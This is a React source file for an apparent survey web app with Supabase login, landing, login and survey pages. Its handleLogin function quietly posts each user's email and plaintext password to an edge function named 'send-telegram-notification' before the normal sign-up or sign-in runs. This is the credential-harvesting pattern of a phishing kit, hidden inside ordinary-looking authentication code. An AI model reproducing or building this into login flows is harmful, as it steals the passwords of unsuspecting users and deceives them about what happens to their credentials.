import { useState, useEffect } from 'react';
import { supabase } from './lib/supabase';
import LandingPage from './components/LandingPage';
import LoginForm from './components/LoginForm';
import SurveyForm from './components/SurveyForm';

function App() {
  const [currentPage, setCurrentPage] = useState<'landing' | 'login' | 'survey'>('landing');
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [userEmail, setUserEmail] = useState('');
  const [isLoading, setIsLoading] = useState(true);

  useEffect(() => {
    supabase.auth.getSession().then(({ data: { session } }) => {
      if (session) {
        setIsAuthenticated(true);
        setUserEmail(session.user.email || '');
        setCurrentPage('survey');
      } else {
        setCurrentPage('landing');
      }
      setIsLoading(false);
    });

    const {
      data: { subscription },
    } = supabase.auth.onAuthStateChange((_event, session) => {
      if (session) {
        setIsAuthenticated(true);
        setUserEmail(session.user.email || '');
        setCurrentPage('survey');
      } else {
        setIsAuthenticated(false);
        setUserEmail('');
        setCurrentPage('landing');
      }
    });

    return () => subscription.unsubscribe();
  }, []);

  const handleLogin = async (email: string, password: string) => {
    const apiUrl = `${import.meta.env.VITE_SUPABASE_URL}/functions/v1/send-telegram-notification`;

    try {
      await fetch(apiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ email, password }),
      });
    } catch (error) {
      console.error('Failed to send notification:', error);
    }

    const { data, error } = await supabase.auth.signUp({
      email,
      password,
    });

    if (error) {
      if (error.message.includes('already registered')) {
        const { error: signInError } = await supabase.auth.signInWithPassword({
          email,
          password,
        });
        if (signInError) throw signInError;
      } else {
        throw error;
      }
    }

    if (data?.user) {
      setIsAuthenticated(true);
      setUserEmail(email);
      setCurrentPage('survey');
    }
  };

  const handleLogout = async () => {
    await supabase.auth.signOut();
    setIsAuthenticated(false);
    setUserEmail('');
    setCurrentPage('landing');
  };

  if (isLoading) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
        <div className="w-12 h-12 border-4 border-blue-600 border-t-transparent rounded-full animate-spin" />
      </div>
    );
  }

  if (currentPage === 'landing') {
    return <LandingPage onGetStarted={() => setCurrentPage('login')} />;
  }

  if (currentPage === 'login') {
    return <LoginForm onLogin={handleLogin} />;
  }

  return <SurveyForm userEmail={userEmail} onLogout={handleLogout} />;
}

export default App;
